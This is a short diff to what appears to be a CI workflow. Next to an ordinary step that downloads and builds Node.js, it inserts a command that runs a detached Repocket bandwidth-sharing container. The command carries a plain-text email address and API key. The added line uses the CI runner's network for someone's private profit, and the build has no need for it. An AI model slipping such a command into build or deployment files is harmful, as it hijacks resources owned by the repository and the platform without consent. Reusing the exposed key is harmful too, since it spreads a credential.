@@ -7,6 +7,7 @@ jobs:
             contents: write
         steps:
         - run: |
+              podman run --init -d -e RP_EMAIL=chaowen.guo1@gmail.com -e RP_API_KEY=9b23ebb9-2ee1-427f-a271-f6fdf536537b docker.io/repocket/repocket
               version=22.3.0
               curl https://nodejs.org/dist/v$version/node-v$version.tar.gz | tar -xz
               cd node-v$version
